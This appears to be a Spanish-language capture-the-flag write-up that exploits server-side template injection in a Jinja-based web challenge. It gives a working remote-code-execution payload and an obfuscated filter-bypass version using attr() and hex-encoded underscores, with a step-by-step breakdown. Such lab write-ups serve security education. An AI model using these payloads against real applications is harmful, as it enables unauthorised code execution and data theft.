#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.

## Análisis inicial

Se prueba una operación básica:

```jinja
{{ 5 + 5 }}
```

Resultado:

```
10
```

### Conclusión

- El servidor sigue evaluando expresiones
- Existe vulnerabilidad de tipo **SSTI (Server-Side Template Injection)**

## Primer intento (payload clásico)

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

## Diferencia clave

|Payload original|Nuevo payload|
|---|---|
|Usa acceso directo (`.`)|Usa funciones (`attr`)|
|Usa nombres normales (`__globals__`)|Usa encoding (`\x5f`)|
|Fácil de detectar|Ofuscado|
## Nuevo payload (bypass)

```jinja
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

---

## Explicación paso a paso

### 1. Evitar el uso de `.`

En lugar de:

```
request.application
```

Se usa:

```
request | attr('application')
```

 `attr()` permite acceder a atributos sin usar el punto

---

### 2. Evitar `__` (doble guion bajo)

Ejemplo:

```
__globals__
```

Se convierte en:

```
\x5f\x5fglobals\x5f\x5f
```

### Explicación

- `\x5f` = `_`
- Entonces:

```
\x5f\x5f = __
```

Se evita el filtro usando encoding hexadecimal
### 3. Acceso a diccionarios con `__getitem__`

En lugar de:

```
__builtins__
```

Se usa:

```
|attr('__getitem__')('__builtins__')
```
Esto simula:

```
obj['__builtins__']
```

---

### 4. Importar módulos

```
__import__('os')
```

Se transforma en:

```
|attr('__getitem__')('__import__')('os')
```

---

### 5. Ejecutar comandos

```
popen('cat flag')
```

---

### 6. Leer resultado

```
read()
```

---

## Traducción completa del payload

"Accede al objeto request → entra al contexto global → obtiene builtins → importa os → ejecuta `cat flag` → devuelve el resultado"
